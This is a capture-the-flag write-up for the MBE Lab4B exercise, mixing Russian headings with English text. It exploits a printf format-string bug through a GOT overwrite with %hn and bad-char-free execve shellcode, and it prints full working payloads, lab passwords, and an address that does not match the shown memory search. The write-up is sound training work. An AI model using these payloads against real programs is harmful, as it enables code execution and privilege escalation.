---
title: "Разбор Lab4B (средне)"
permalink: /writeups/mbe/lab4b/
excerpt: "Разбор Lab4B."
---

---
First, log into the Lab04 as **Lab4B** (`lab4B:bu7_1t_w4sn7_brUt3_f0rc34b1e!`) and go to the challenges folder:

```shell
$ ssh lab4B@<VM_IP>
$ cd /levels/lab04/
```

Let's execute the program:

```shell
lab4B@warzone:/levels/lab04$ ./lab4B
TEST
test
```

Okay, so it seems that this executable simply convert what we type and return it in lower case to the standard output.

## Анализ исходного кода

Let's take a look at the source:

```c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int main(int argc, char *argv[])
{
    int i = 0;
    char buf[100];

    /* read user input securely */
    fgets(buf, 100, stdin);

    /* convert string to lowercase */
    for (i = 0; i < strlen(buf); i++)
        if (buf[i] >= 'A' && buf[i] <= 'Z')
            buf[i] = buf[i] ^ 0x20;

    /* print out our nice and new lowercase string */
    printf(buf);

    exit(EXIT_SUCCESS);
    return EXIT_FAILURE;
}
```

Here, the vulnerability is, once again, located in the *printf()* function where no format specifiers are set. Let's check that assumption:

```shell
lab4B@warzone:/levels/lab04$ ./lab4B
%08x
00000064
```

Perfect. Now, we need to find a way to exploit this vulnerability. One way to do that would be to overwrite the address of *exit()* with the address of our shellcode. Why? Simply, because after calling *printf()*, the next function to be called is *exit()*.

The address of *exit()* is stored in the GOT. The Global Offset Table (or GOT) contains direct access to the absolute address of a symbol. As the GOT is writable, we could overwrite the *exit()* address with the address of our choice to redirect the execution flow.

First we have to find the offset of *exit()* in the GOT:

```shell
lab4B@warzone:/levels/lab04$ readelf --relocs lab4B

Relocation section '.rel.dyn' at offset 0x4bc contains 2 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
0804999c  00000406 R_386_GLOB_DAT    00000000   __gmon_start__
080499cc  00001005 R_386_COPY        080499cc   stdin

Relocation section '.rel.plt' at offset 0x4cc contains 6 entries:
 Offset     Info    Type            Sym.Value  Sym. Name
080499ac  00000207 R_386_JUMP_SLOT   00000000   printf
080499b0  00000307 R_386_JUMP_SLOT   00000000   fgets
080499b4  00000407 R_386_JUMP_SLOT   00000000   __gmon_start__
080499b8  00000507 R_386_JUMP_SLOT   00000000   exit
080499bc  00000607 R_386_JUMP_SLOT   00000000   strlen
080499c0  00000707 R_386_JUMP_SLOT   00000000   __libc_start_main
```

Here, the address of *exit()* is `080499b8`. Then, we have to find the offset of our input string:

```shell
lab4B@warzone:/levels/lab04$ ./lab4B 
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
aaaa00000064.b7fcdc20.00000000.bffff6e4.bffff658.61616161.78383025.3830252e

lab4B@warzone:/levels/lab04$ ./lab4B
AAAA%6$p
aaaa0x61616161
```

So, our string is the **6th** parameter on the stack. But, why do we need this information? Well, that's because we'll use another interesting format specifier: **%n**.

The **%n** specifier will write the size of our input at the address pointed by **%n**. For example, the following input : **AAAA%n**, means that we will write the value *4* (because the size of "AAAA" equals 4 bytes) at the address pointed by **%n**. But, where on the stack *%n* points to?

Well, let’s try to submit **AAAA%n** into the program :

```shell
$ ./lab4B
AAAA%n
Segmentation fault (core dumped)
```

Okay, so the program just *segfault*. Let's check **where** we tried to write **4** with the *%p* specifier:

```shell
$ ./lab4B
AAAA%p
aaaa0x64
```

As you can see, *0x64* is not a valid address, that's why it can't write here.

So, instead of using a simple *%n*, we can use `%<num>$n` to specify the address to write to. What would happen if `%<num>$n` points to the beginning of our string? Well, it will use the address specified in the beginning of our strings to write data to. It means that instead of using **AAAA**, we'll use a valid address, in this case it will be the address of *exit()*.

Let's try to overwrite the *exit()* address. In the following dump, I'll put a breakpoint right before the *exit()* call, then I'll send the payload.

```nasm
$ gdb ./lab4B
Reading symbols from ./lab4B...(no debugging symbols found)...done.
gdb-peda$ break *main+156 ; Break before exit()
Breakpoint 1 at 0x8048729
gdb-peda$ x/x 0x080499b8 ; Original exit() address
0x80499b8 <exit@got.plt>:  0x08048566
gdb-peda$ r < <(python -c 'print("\xb8\x99\x04\x08" + "%6$n")')
Starting program: /levels/lab04/lab4B < <(python -c 'print("\xb8\x99\x04\x08" + "%6$n")')
��
[----------------------------------registers-----------------------------------]
EAX: 0x5
EBX: 0x9 ('\t')
ECX: 0x0
EDX: 0xb7fce898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbffff6c8 --> 0x0
ESP: 0xbffff640 --> 0xbffff658 --> 0x80499b8 --> 0x4
EIP: 0x8048729 (<main+156>:   mov    DWORD PTR [esp],0x0)
EFLAGS: 0x282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x804871d <main+144>:   lea    eax,[esp+0x18]
   0x8048721 <main+148>:   mov    DWORD PTR [esp],eax
   0x8048724 <main+151>:   call   0x8048530 <printf@plt>
=> 0x8048729 <main+156>:   mov    DWORD PTR [esp],0x0
   0x8048730 <main+163>:   call   0x8048560 <exit@plt>
   0x8048735:  xchg   ax,ax
   0x8048737:  xchg   ax,ax
   0x8048739:  xchg   ax,ax
[------------------------------------stack-------------------------------------]
0000| 0xbffff640 --> 0xbffff658 --> 0x80499b8 --> 0x4
0004| 0xbffff644 --> 0x64 ('d')
0008| 0xbffff648 --> 0xb7fcdc20 --> 0xfbad2088
0012| 0xbffff64c --> 0x0
0016| 0xbffff650 --> 0xbffff704 --> 0x27f77235
0020| 0xbffff654 --> 0xbffff678 --> 0xb7e2fbf8 --> 0x2aa0
0024| 0xbffff658 --> 0x80499b8 --> 0x4
0028| 0xbffff65c ("%6$n\n")
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048729 in main ()
gdb-peda$ x/x 0x080499b8
0x80499b8 <exit@got.plt>:  0x04 ; Overwrite!
```

As you can see, we overwrote the original address with **0x04** (which is the size of the address). Awesome, it seems that we can alter the GOT. Here, we could use a small shellcode and overwrite the *exit()* address with a stack address. I was thinking about something like this:

`[address of exit() in GOT][magic sauce to rewrite the GOT][NOP + Shellcode]`

Let's switch to `gdb`.

## Динамический анализ

First, let's see where our shellcode will be in memory. Here, I put a breakpoint on `main+163` as it is the call to *exit()*.

```nasm
lab4B@warzone:/levels/lab04$ gdb -q ./lab4B
Reading symbols from ./lab4B...(no debugging symbols found)...done.
gdb-peda$ break *main+163
Breakpoint 1 at 0x8048730
gdb-peda$ r < <(python -c 'print("\x90" * 50)')
Starting program: /levels/lab04/lab4B < <(python -c 'print("\x90" * 50)')
��������������������������������������������������
[----------------------------------registers-----------------------------------]
EAX: 0x33 ('3')
EBX: 0x33 ('3')
ECX: 0x0
EDX: 0xb7fce898 --> 0x0
ESI: 0x0
EDI: 0x0
EBP: 0xbffff6b8 --> 0x0
ESP: 0xbffff630 --> 0x0
EIP: 0x8048730 (<main+163>:   call   0x8048560 <exit@plt>)
EFLAGS: 0x286 (carry PARITY adjust zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x8048721 <main+148>:   mov    DWORD PTR [esp],eax
   0x8048724 <main+151>:   call   0x8048530 <printf@plt>
   0x8048729 <main+156>:   mov    DWORD PTR [esp],0x0
=> 0x8048730 <main+163>:   call   0x8048560 <exit@plt>
   0x8048735:  xchg   ax,ax
   0x8048737:  xchg   ax,ax
   0x8048739:  xchg   ax,ax
   0x804873b:  xchg   ax,ax
Guessed arguments:
arg[0]: 0x0
[------------------------------------stack-------------------------------------]
0000| 0xbffff630 --> 0x0
0004| 0xbffff634 --> 0x64 ('d')
0008| 0xbffff638 --> 0xb7fcdc20 --> 0xfbad2088
0012| 0xbffff63c --> 0x0
0016| 0xbffff640 --> 0xbffff6f4 (" +d<0/\035\004")
0020| 0xbffff644 --> 0xbffff668 --> 0x90909090
0024| 0xbffff648 --> 0x90909090
0028| 0xbffff64c --> 0x90909090
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, 0x08048730 in main ()
gdb-peda$ x/64x $esp
0xbffff630: 0x00000000  0x00000064  0xb7fcdc20  0x00000000
0xbffff640: 0xbffff6f4  0xbffff668  0x90909090  0x90909090
0xbffff650: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffff660: 0x90909090  0x90909090  0x90909090  0x90909090
0xbffff670: 0x90909090  0x90909090  0x000a9090  0x08048505
0xbffff680: 0xbffff887  0x0000002f  0x080499a0  0x08048792
0xbffff690: 0x00000001  0xbffff754  0xbffff75c  0xb7e5642d
0xbffff6a0: 0xb7fcd3c4  0xb7fff000  0x0804874b  0x00000033
```

Here, if we leave some space to rewrite the GOT, `0xbffff670` would be a good candidate to place our NOP-sled and shellcode. As we saw earlier, we replaced the *exit()* function address (at `0x080499b8`) by **0x04**, but we don't want to write *4*, we want to write **0xbffff670** (the stack pointer to our NOP sled). 

However, we got an issue, if writing 4 bytes as input means writing "4" at a specific address. Well, you'll have to write 3221223024 (*0xbffff670* in decimal) chars to write **0xbffff670**... impossible! Why? Let me show you.

There is a little trick to write the **value** we want: 

- `\xb8\x99\x04\x08%<value-4>x%6$n` (it's *value-4* because we already wrote 4 bytes, `\xb8\x99\x04\x08`)

For example, `\xb8\x99\x04\x08%96x%6$n` will write the value **100** at the address **0x080499b8**. 

However, because `%96x` will print your argument padded with 100 bytes (FYI, it pads with "space"), it will take forever to write **3221223024** chars. Let's see that in memory (don't forget to place a breakpoint on *exit()*). 

```nasm
gdb-peda$ r < <(python -c 'print("\xb8\x99\x04\x08" + "%96x%6$n")')
Starting program: /levels/lab04/lab4B < <(python -c 'print("\xb8\x99\x04\x08" + "%96x%6$n")')
�                                                           64 # See the padding ?

...[snip]...

Legend: code, data, rodata, value

Breakpoint 1, 0x08048730 in main ()
gdb-peda$ x/x 0x080499b8
0x80499b8 <exit@got.plt>:  0x64 # 100 in decimal
```

**Watch Out!** It's `%<Y>x` **NOT** `%<Y>$x`. The first one will **pad** the *1st* argument with *Y* bytes. However, the second one will **print** the *Y*th argument.
{: .notice--warning}

So, instead of writing a *long* integer (4 bytes), we'll write 2 *short* integers (2 bytes). To do that, we'll use another specifier: **%hn** (here, the `h` means *short integer*).

Let's break this down:

- We want to write **0xbffff670**. It means, **0xbfff** (49151 in decimal) in the high order bytes and **0xf670** (63088 in decimal) in the low order bytes.
- We want to write those value at **0x080499b8**. It means writing **0xbfff** at **0x080499b8 + 2** = **0x080499ba** (high order) and **0xf670** at **0x080499b8** (low order).

Now, we have to figure out the value to set for the padding. Here is the formula: 

**[The value we want] - [The bytes already wrote] = [The value to set]**.

Let's start with the *high order* bytes:

It will be *49151 - 8 = 49143*, because we will already write **8** bytes (the two **4** bytes addresses).

Then, the *low order* bytes:

It'll will be *63088 - 49151 = 13937*, because we already wrote **49151** bytes (the two **4** bytes addresses and **49143** bytes from the previous writing).

Now we can construct the exploit: 

It'll be: `"\xba\x99\x04\x08" + "\xb8\x99\x04\x08" + "%49143x" + "%6$hn" + "%13937x" + "%7$hn"`. Let me explain:

- `\xba\x99\x04\x08` or **0x080499ba** (in reverse order) points to the **high** order bytes.
- `\xb8\x99\x04\x08` or **0x080499b8** (in reverse order) points to the **low** order bytes.
- `%49143x` will write *49143* bytes on the standard output.
- `%6$hn` will write these bytes at the first address specified (**0x080499ba**).
- `%13937x` will write *13937* bytes on the standard output.
- `%7$hn` will write these bytes at the second address specified (**0x080499b8**).

Let's try that in `gdb`. Again, don't forget to set a breakpoint on the *exit()* call.

```nasm
gdb-peda$ break *main+163
Breakpoint 1 at 0x8048730
gdb-peda$ x/x 0x080499b8
0x80499b8 <exit@got.plt>:  0x08048566
gdb-peda$ r < <(python -c 'print("\xba\x99\x04\x08" + "\xb8\x99\x04\x08" + "%49143x" + "%6$hn" + "%13937x" + "%7$hn")')
Starting program: /levels/lab04/lab4B < <(python -c 'print("\xba\x99\x04\x08" + "\xb8\x99\x04\x08" + "%49143x" + "%6$hn" + "%13937x" + "%7$hn")')
��

...[snip]...

Breakpoint 1, 0x08048730 in main ()
gdb-peda$ x/x 0x080499b8
0x80499b8 <exit@got.plt>:  0xbffff670
```

Awesome, the orginal *exit()* address (`0x08048566`) has been replaced by `0xbffff670`. Now, the idea would be to place a NOP-sled and a shellcode right after our format string exploit given the new address point right after the first part of the exploit.

Let's write this shellcode.

## Shellcode

Remember, we have a small constraint here, the shellcode can't contain bytes between 0x41 (A) and 0x5A (Z) as the code will convert them to the lower string version of the ASCII letters. Let's do a quick rewrite of one of our previous shellcode to avoid the *badchars*. Here is the original version:

```nasm
global _start
_start:

xor    eax, eax ; EAX = 0
push   eax ; push our null byte on the stack to end the string
; push "/bin//sh" in reverse order
push   0x68732f2f ; "hs//"
push   0x6e69622f ; "nib/"

; execve("/bin//sh/", 0, 0);
mov    ebx, esp ; EBX = ptr to "/bin//sh"
mov    ecx, eax ; ECX = 0
mov    edx, eax ; EDX = 0
mov    al, 0xb ; sys_execve()
int    0x80
```

**Заметка** The *Warzone* VM doesn't have **NASM** installed, so I did the development on another Linux VM.
{: .notice--info}

```shell
$ nano shellcode.asm
$ nasm -f elf32 shellcode.asm
```

Then, we can check the code and generate the shellcode.

```shell
$ objdump -M intel -d shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    eax,eax
   2:   50                      push   eax ; 50 = "P" - it will break the code
   3:   68 2f 2f 73 68          push   0x68732f2f
   8:   68 2f 62 69 6e          push   0x6e69622f
   d:   89 e3                   mov    ebx,esp
   f:   89 c1                   mov    ecx,eax
  11:   89 c2                   mov    edx,eax
  13:   b0 0b                   mov    al,0xb
  15:   cd 80                   int    0x80
```

Here, the `push eax` will cause an issue as it will be *0x50* in machine code. To bypass this issue, let's see if we can find a reference to `/bin/bash` in memory to gain some space and remove the `push eax` instruction.

```nasm
lab4B@warzone:/levels/lab04$ gdb -q ./lab4B
Reading symbols from ./lab4B...(no debugging symbols found)...done.
gdb-peda$ break main
Breakpoint 1 at 0x8048691
gdb-peda$ run
Starting program: /levels/lab04/lab4B

...[snip]...

Breakpoint 1, 0x08048691 in main ()
gdb-peda$ searchmem "/bin/bash"
Searching for '/bin/bash' in: None ranges
Found 1 results, display max 1 items:
[stack] : 0xbffff8b4 ("/bin/bash")
```

We do have a reference of **/bin/bash** at the `0xbffff8b4` address. Now, we can write an alternative version of this shellcode.

```nasm
global _start
_start:
xor    eax,eax ; EAX = 0
mov    ebx, 0xb7f83a24 ; pointer to '/bin/bash'
mov    ecx, ecx
mov    edx, ecx
mov    al, 0xb
int    0x80
```

Assemble the code:

```shell
$ nano shellcode.asm
$ nasm -f elf32 shellcode.asm
```

Then, let's check the result.

```nasm
$ objdump -M intel -d shellcode.o

shellcode.o:     file format elf32-i386

Disassembly of section .text:

00000000 <_start>:
   0:   31 c0                   xor    eax,eax
   2:   bb 24 3a f8 b7          mov    ebx,0xb7f83a24
   7:   89 c9                   mov    ecx,ecx
   9:   89 ca                   mov    edx,ecx
   b:   b0 0b                   mov    al,0xb
   d:   cd 80                   int    0x80
```

Awesome, no *badchars*. Here is our little shellcode:

- `\x31\xc0\xbb\x24\x3a\xf8\xb7\x89\xc9\x89\xca\xb0\x0b\xcd\x80`

If we add a NOP-sled and our shellcode right after the first part of the exploit, we should get a shell.

```nasm
gdb-peda$ r < <(python -c 'print("\xba\x99\x04\x08" + "\xb8\x99\x04\x08" + "%49143x" + "%6$hn" + "%13937x" + "%7$hn" + 32 * "\x90" + "\x31\xc0\xbb\x24\x3a\xf8\xb7\x89\xc9\x89\xca\xb0\x0b\xcd\x80")')
Starting program: /levels/lab04/lab4B < <(python -c 'print("\xba\x99\x04\x08" + "\xb8\x99\x04\x08" + "%49143x" + "%6$hn" + "%13937x" + "%7$hn" + 32 * "\x90" + "\x31\xc0\xbb\x24\x3a\xf8\xb7\x89\xc9\x89\xca\xb0\x0b\xcd\x80")')
��

...[snip]...

process 2775 is executing new program: /bin/dash
[Inferior 1 (process 2775) exited normally]
Warning: not running or target is remote
```

The exploit seems to be working inside `gdb`. However, like in the previous levels, we may need to adjust the return address.

## Решение

There is a quick trick to easily find the difference between the stack address inside and outside `gdb`. In `gdb`, our return address was `0xbffff670`. Now, if you set a breakpoint on *exit()* and check the stack, you will see that we can leak an address.

```nasm
gdb-peda$ break *main+163
Breakpoint 1 at 0x8048730
gdb-peda$ run
Starting program: /levels/lab04/lab4B
AAAA
aaaa

Breakpoint 1, 0x08048730 in main ()
gdb-peda$ x/16x $esp
0xbffff630: 0x00000000  0x00000064  0xb7fcdc20  0x00000000
0xbffff640: 0xbffff6f4  0xbffff668  0x61616161  0x0804000a
0xbffff650: 0xb7fff938  0x00000000  0x000000c2  0xb7eb8216
0xbffff660: 0xffffffff  0xbffff68e  0xb7e2fbf8  0xb7e56273
```

See the `0xbffff668` value at `0xbffff644`? It is not too far from `0xbffff670` (return address). Let's check this address outside `gdb` with the format string exploit.

```shell
lab4B@warzone:/levels/lab04$ ./lab4B
AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x
aaaa00000064.b7fcdc20.00000000.bffff6b4.bffff628.61616161.78383025.3830252e
```

The `0xbffff668` is now `0xbffff628`. It means we have 40 bytes of difference. So, to fix our exploit we just need to subtract **40** to **13937** which is equal to **13897**. Let's see if it's working.

```shell
lab4B@warzone:/levels/lab04$ (python -c 'print("\xba\x99\x04\x08" + "\xb8\x99\x04\x08" + "%49143x" + "%6$hn" + "%13897x" + "%7$hn" + 32 * "\x90" + "\x31\xc0\xbb\x24\x3a\xf8\xb7\x89\xc9\x89\xca\xb0\x0b\xcd\x80")'; cat) | ./lab4B

...[snip]...

whoami
lab4A
cat /home/lab4A/.pass
fg3ts_d0e5n7_m4k3_y0u_1nv1nc1bl3
```

Easy right? You can go to the last [challenge](/writeups/mbe/lab4a/) of this level.
